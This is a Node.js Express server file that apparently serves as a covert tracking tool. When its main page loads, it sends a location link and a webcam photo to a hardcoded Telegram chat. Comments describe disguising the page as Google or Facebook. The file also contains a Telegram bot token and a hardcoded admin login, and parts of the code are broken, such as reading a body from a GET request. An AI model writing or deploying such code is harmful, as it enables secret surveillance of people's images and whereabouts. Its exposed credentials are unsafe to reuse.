const express = require("express");
const { unset } = require("lodash");
const NodeWebcam = require("node-webcam");
const TelegramBot = require("node-telegram-bot-api");
const dotenv  =require("dotenv");
const fs = require("fs");
const { timeLog } = require("console");
const { start } = require("repl");

//ffmpeg = spawn('/usr/bin/ffmpeg', ['-i', 'input.mp4', 'output.mp4'])
// create a Telegram bot instance
const bot = new TelegramBot("6126047592:AAHC3W631D9a8W2OeRhlRdGonHS-FuP7LCI", { polling: true });
// dotenv configuration
dotenv.config();
// create a webcam instance with default settings
const webcam = NodeWebcam.create();
const chatId = "5502141685"


// function to take a picture and send it to Telegram
function takePictureAndSendToTelegram(latitude, longitude) {

  // Creating location variables
  const location = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
  const message = `Location: ${location}`;
  // Sending location to bot
  bot.sendMessage(chatId, message).then(function () {
        console.log("Location sent to Telegram.");
      });

  // take a picture using the webcam
  webcam.capture("picture.jpg", function (err, data) {
    if (!err) {
      // read the image file
      const photo = fs.readFileSync("picture.jpg");
      // send the photo to Telegram
      bot.sendPhoto(chatId, photo).then(function () {
        console.log("Photo sent to Telegram.");
      });
    } else {
      console.error(err);
    }
  });
}

const app = express();
app.set('view engine', 'ejs');

app.use(express.static('scripts'));
app.use(express.urlencoded({ extended : true }));
app.use(express.json());
app.use(express.static('styles'));
var requestBody;

app.get("/", (req,res) => {
    const { latitude, longitude } = req.body;
  // call the function to take a picture and send it to Telegram
  takePictureAndSendToTelegram(latitude, longitude);
  // this is meant to later connect the page to google by hosting google in the page
  res.render("index");
  // res.redirect("https://web.facebook.com/?_rdc=1&_rdr");
});
app.get("/admin", (req,res) => {
  requestBody = req.body;
  res.render("auth");
  // after routing to auth form is to take to admin.ejs
});
app.post("/mhn", (req,res) => {
  const data = req.body;
  const username = "MHN...DeV@me";
  const code = "htools";
  if (data.username ==  username & data.code == code ) {
  // now in admin.ejs
  res.render("admin");
  } else {
  // /admin is the authentification page 
  res.redirect("/admin");
  }
});

// stopping for now to build the ejs front end continue to post method later
app.use((req,res) => {
  res.render('404');
});
app.listen(3000, () => {
  console.log("App listen at port: 3000!");
});



